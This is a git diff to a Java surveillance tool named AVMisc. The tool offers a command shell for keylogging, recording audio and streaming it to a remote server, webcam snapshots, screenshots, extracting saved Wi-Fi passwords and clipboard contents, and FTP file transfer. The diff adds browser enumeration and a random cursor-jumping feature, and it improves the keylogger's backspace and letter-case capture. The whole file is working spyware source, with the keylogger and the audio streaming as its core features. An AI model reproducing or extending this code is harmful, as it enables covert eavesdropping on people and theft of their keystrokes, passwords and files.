@@ -1,6 +1,7 @@
 package com.AVMisc;
 
 import java.awt.AWTException;
+import java.awt.Dimension;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
@@ -25,18 +26,21 @@ import java.nio.file.StandardOpenOption;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
+import java.util.InputMismatchException;
 import java.util.LinkedHashMap;
 import java.util.List;
+import java.util.Random;
 import java.util.Scanner;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import java.util.stream.Collectors;
-import java.util.InputMismatchException;
 
 import javax.imageio.ImageIO;
+import javax.sound.sampled.AudioFormat;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Mixer.Info;
+import javax.sound.sampled.TargetDataLine;
 
 import org.apache.commons.net.ftp.FTPClient;
 import org.apache.commons.net.ftp.FTPReply;
@@ -46,14 +50,15 @@ import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
+import com.github.sarxos.webcam.Webcam;
+import com.github.sarxos.webcam.WebcamException;
+
 import de.ralleytn.simple.audio.Audio;
 import de.ralleytn.simple.audio.AudioEvent;
 import de.ralleytn.simple.audio.AudioException;
+import de.ralleytn.simple.audio.FileFormat;
 import de.ralleytn.simple.audio.Recorder;
 import de.ralleytn.simple.audio.StreamedAudio;
-
-import com.github.sarxos.webcam.Webcam;
-import com.github.sarxos.webcam.WebcamException;
 
 
 
@@ -70,6 +75,7 @@ public class AVMisc implements NativeKeyListener {
 	private Thread recordingAudioThread;
 	private Thread playingAudioThread;
 	private Thread recordingVideoThread;
+	private Thread cursorJumpThread;
 	private FTPClient ftp;
 	private String recordingAudioFileName;
 	private String playingAudioFileName;
@@ -83,11 +89,30 @@ public class AVMisc implements NativeKeyListener {
 	private List<Webcam> webcams;
 	private Path klFilePath = Paths.get("file.txt");
 	private Path klLogFilePath = Paths.get("log.txt");
+	private LinkedHashMap<String, String> helpItems = new LinkedHashMap<>();
+	private TargetDataLine line = null;
+	private AudioFormat audioFormat = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
+	
+	private enum BROWSER_ID {
+		FIREFOX,
+		CHROME,
+		SAFARI
+	}
 	
 
 	public static void main(String[] args) {
-		AVMisc av = new AVMisc();
-		av.begin();
+		AVMisc av = null;
+		try {
+			av = new AVMisc();
+			
+		}
+		catch(NoClassDefFoundError e) {
+			e.printStackTrace();
+		}
+		finally {
+			av.begin();
+		}
+		
 	}
 	
 	public AVMisc() {
@@ -99,6 +124,28 @@ public class AVMisc implements NativeKeyListener {
 		logger.setLevel(Level.OFF);
 		logger.setUseParentHandlers(false);
 		webcams = Webcam.getWebcams();
+		
+		helpItems.put("list_devices", "List the audio and video devices on the system");
+		helpItems.put("list_browsers", "List the browsers installed on the computer");
+		helpItems.put("start_audio_record", "Start recording audio on the system");
+		helpItems.put("stop_audio_record", "Stop recording audio");
+		helpItems.put("start_audio_playback", "Play an audio file on the system");
+		helpItems.put("stop_audio_playback", "Stop playing audio");
+		helpItems.put("start_streaming_audio", "Connects to a server and starts streaming audio");
+		helpItems.put("stop_streaming_audio", "Stop streaming audio");
+		helpItems.put("start_video_record", "Start recording video");
+		helpItems.put("stop_video_record", "Stop recording video");
+		helpItems.put("screenshot", "Take a screenshot");
+		helpItems.put("snapshot", "Take a snapshot with the webcam");
+		helpItems.put("start_kl", "Start the keylogger");
+		helpItems.put("stop_kl", "Stop the keylogger");
+		helpItems.put("wifi", "Get the passwords for the wireless profiles on the system(Windows only)");
+		helpItems.put("clipboard", "View the contents of the clipboard");
+		helpItems.put("start_cursor_jump", "Make cursor move randomly");
+		helpItems.put("stop_cursor_jump", "Stop moving the cursor");
+		helpItems.put("upload", "Upload a file to the server");
+		helpItems.put("download", "Download a file from the server");
+		helpItems.put("help", "Show this help message");
 	}
 	
 	
@@ -108,9 +155,12 @@ public class AVMisc implements NativeKeyListener {
 			System.out.print("av_misc>");
 			command = sc.nextLine();
 			switch (command.toLowerCase()) {
-				case "list":
+				case "list_devices":
 					listAudioDevices();
 					listVideoDevices();
+					break;
+				case "list_browsers":
+					listBrowsers();
 					break;
 				case "start_audio_record":
 					recordAudio(false);
@@ -153,6 +203,12 @@ public class AVMisc implements NativeKeyListener {
 					break;
 				case "clipboard":
 					showClipboardContents();
+					break;
+				case "start_cursor_jump":
+					startCursorJump();
+					break;
+				case "stop_cursor_jump":
+					stopCursorJump();
 					break;
 				case "upload":
 					upload();
@@ -202,10 +258,68 @@ public class AVMisc implements NativeKeyListener {
 		}
 	}
 	
+	
+	private void checkForBrowser(BROWSER_ID id) {
+		String path = System.getenv("ProgramFiles");
+		String path32 = path + " (x86)";
+		String macPath = "/Applications/";
+		File f = null, f2 = null;
+		switch(id) {
+			// Check if Firefox is installed on the computer
+			case FIREFOX:
+				// Windows
+				f = new File(String.format("%s\\Mozilla Firefox\\firefox.exe", path));
+				f2 = new File(String.format("%s\\Mozilla Firefox\\firefox.exe", path32));
+				if(f.exists() || f2.exists()) {
+					System.out.printf("%5sFIREFOX\n", "");
+				}
+				
+				// MAC OS
+				f = new File(macPath + "Firefox.app");
+				if(f.exists()) {
+					System.out.printf("%5sFIREFOX\n", "");
+				}
+				break;
+			// Check if Chrome is installed on the computer
+			case CHROME:
+				// Windows
+				f = new File(String.format("%s\\Google\\Chrome\\Application\\chrome.exe", path));
+				f2 = new File(String.format("%s\\Google\\Chrome\\Application\\chrome.exe", path32));
+				if(f.exists() || f2.exists()) {
+					System.out.printf("%5sCHROME\n", "");
+				}
+				// MAC OS
+				f = new File(macPath + "Chrome.app");
+				if(f.exists()) {
+					System.out.printf("%5sCHROME\n", "");
+				}
+				break;
+			case SAFARI:
+				f = new File(macPath + "Safari.app");
+				if(f.exists()) {
+					System.out.printf("%5sSAFARI\n", "");
+				}
+				break;
+			default:
+				System.out.println("This browser is not recognized");
+			
+		}
+	}
+	
+
+	private void listBrowsers() {
+		System.out.println("Browsers on this computer:");
+		for(BROWSER_ID b : BROWSER_ID.values()) {
+			checkForBrowser(b);
+		}
+	}
+	
+	
 	/***
 	 * Record Audio
 	 */
 	private void recordAudio(boolean streaming) {
+		// Check if audio is already being recorded
 		if (!recordingAudio.get()) {
 			if(streaming) {
 				try {
@@ -242,20 +356,18 @@ public class AVMisc implements NativeKeyListener {
 						try {
 							Socket socket = new Socket(streamingAudioIP, streamingAudioPort);
 							try(DataOutputStream dos = new DataOutputStream(socket.getOutputStream())) {
-								recorder = new Recorder();
+								recorder = new Recorder(FileFormat.AU, audioFormat);
 								recorder.start(dos);
-								
 								recordingAudio.set(true);
-								System.out.println("Streaming audio for 2 minutes...");
-								Thread.sleep(120000);
-								socket.close();
+								System.out.println("Streaming audio for 3 minutes...");
+								Thread.sleep(180000);
 							} 
-							catch (AudioException | IOException e) {
-								System.out.println(e.getMessage());
+							catch ( IOException | InterruptedException | AudioException e) {
+								e.printStackTrace();
 							}
-							catch(InterruptedException e) {}
 							finally {
 								recorder.stop();
+								socket.close();
 								recordingAudio.set(false);
 								stopStreaming.set(false);
 							}
@@ -299,6 +411,8 @@ public class AVMisc implements NativeKeyListener {
 	private void stopRecordingAudio() {
 		if(recordingAudio.get()) {
 			recordingAudioThread.interrupt();
+			line.stop();
+			line.close();
 		}
 	}
 	
@@ -307,7 +421,7 @@ public class AVMisc implements NativeKeyListener {
 	 */
 	private void playAudio() {
 		if(!playingAudio.get()) {
-			System.out.print("Enter the path of the audio file to play: ");
+			System.out.print("Enter the path of the audio file to play on the local machine: ");
 			String fileName = sc.nextLine();
 			playingAudioThread = new Thread() {
 				@Override
@@ -494,6 +608,48 @@ public class AVMisc implements NativeKeyListener {
 		}
 	}
 	
+	
+	/***
+	 * Make cursor move randomly
+	 */
+	private void startCursorJump() {
+		
+		try {
+			cursorJumpThread = new Thread() {
+				@Override
+				public void run() {
+					Robot r = null;
+					Random rand = new Random();
+					try {
+						r = new Robot();
+						Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+						
+						while(true) {
+							r.mouseMove(rand.nextInt(screenSize.width), rand.nextInt(screenSize.height));
+							Thread.sleep(10);
+						}
+						
+					} catch (AWTException | InterruptedException e) { }
+				}
+			};
+			cursorJumpThread.start();
+		}
+		catch(IllegalThreadStateException e) {}
+		
+	}
+	
+	
+	/***
+	 * Stop cursor jump
+	 */
+	private void stopCursorJump() {
+		if(cursorJumpThread != null) {
+			cursorJumpThread.interrupt();
+			cursorJumpThread = null;
+		}
+	}
+	
+	
 	/***
 	 * Get WiFi Info
 	 */
@@ -551,6 +707,9 @@ public class AVMisc implements NativeKeyListener {
 					Files.write(Paths.get(fileName), data.getBytes());
 					System.out.printf("Wifi data saved as %s\n", fileName);
 				}
+				else {
+					System.out.println("No data found");
+				}
 				in.close();
 				data = null;
 			}
@@ -572,7 +731,7 @@ public class AVMisc implements NativeKeyListener {
 			else {
 				ftp.setFileType(FTPClient.BINARY_FILE_TYPE);
 				// Upload a file
-				System.out.print("Enter the path of the file to upload: ");
+				System.out.print("Enter the path of the file on the local machine to upload: ");
 				String filePath = sc.nextLine();
 				if(Files.exists(Paths.get(filePath))) {
 					String fileName = filePath.substring(filePath.lastIndexOf('\\')+1);
@@ -598,7 +757,7 @@ public class AVMisc implements NativeKeyListener {
 	}
 	
 	/***
-	 * Download files
+	 * Download files from your server to the local machine
 	 */
 	private void download() {
 				try {
@@ -653,31 +812,10 @@ public class AVMisc implements NativeKeyListener {
 	 * Show Help
 	 */
 	private void showHelp() {
-		LinkedHashMap<String, String> helpItems = new LinkedHashMap<>();
-		helpItems.put("list", "List the audio devices on the system");
-		helpItems.put("start_audio_record", "Start recording audio on the system");
-		helpItems.put("stop_audio_record", "Stop recording audio");
-		helpItems.put("start_audio_playback", "Play an audio file on the system");
-		helpItems.put("stop_audio_playback", "Stop playing audio");
-		helpItems.put("start_streaming_audio", "Connects to a server and starts streaming audio");
-		helpItems.put("stop_streaming_audio", "Stop streaming audio");
-		helpItems.put("start_video_record", "Start recording video");
-		helpItems.put("stop_video_record", "Stop recording video");
-		helpItems.put("screenshot", "Take a screenshot");
-		helpItems.put("snapshot", "Take a snapshot with the webcam");
-		helpItems.put("start_kl", "Start the keylogger");
-		helpItems.put("stop_kl", "Stop the keylogger");
-		helpItems.put("wifi", "Get the passwords for the wireless profiles on the system(Windows only)");
-		helpItems.put("clipboard", "View the contents of the clipboard");
-		helpItems.put("upload", "Upload a file to the server");
-		helpItems.put("download", "Download a file from the server");
-		helpItems.put("help", "Show this help message");
-		
 		System.out.println("------------------------\n     AVMISC OPTIONS\n------------------------\n");
 		helpItems.forEach((key, value) -> {
 			System.out.printf("\t'%s': %s\n\n", key, value);
 		});
-		
 	}
 	
 	
@@ -744,12 +882,14 @@ public class AVMisc implements NativeKeyListener {
 					break;
 				case NativeKeyEvent.VC_BACKSPACE:
 					byte[] data = Files.readAllBytes(klFilePath);
-					byte[] arr = Arrays.copyOf(data, data.length-1);
-					Files.deleteIfExists(klFilePath);
-					Files.write(klFilePath, arr, StandardOpenOption.CREATE_NEW);
-					data = null;
-					arr = null;
-					break;
+					if (data.length > 0) {
+						byte[] arr = Arrays.copyOf(data, data.length - 1);
+						Files.deleteIfExists(klFilePath);
+						Files.write(klFilePath, arr, StandardOpenOption.CREATE_NEW);
+						data = null;
+						arr = null;
+					}
+				break;
 				case NativeKeyEvent.VC_BACKQUOTE:
 					keyText = shiftIsDown ? "~" : "`";
 					break;
@@ -839,7 +979,7 @@ public class AVMisc implements NativeKeyListener {
 				case NativeKeyEvent.VC_X:
 				case NativeKeyEvent.VC_Y:
 				case NativeKeyEvent.VC_Z:
-					keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
+					keyText = shiftIsDown ? NativeKeyEvent.getKeyText(event.getKeyCode()) : NativeKeyEvent.getKeyText(event.getKeyCode()).toLowerCase();
 					break;
 				default:
 					break;
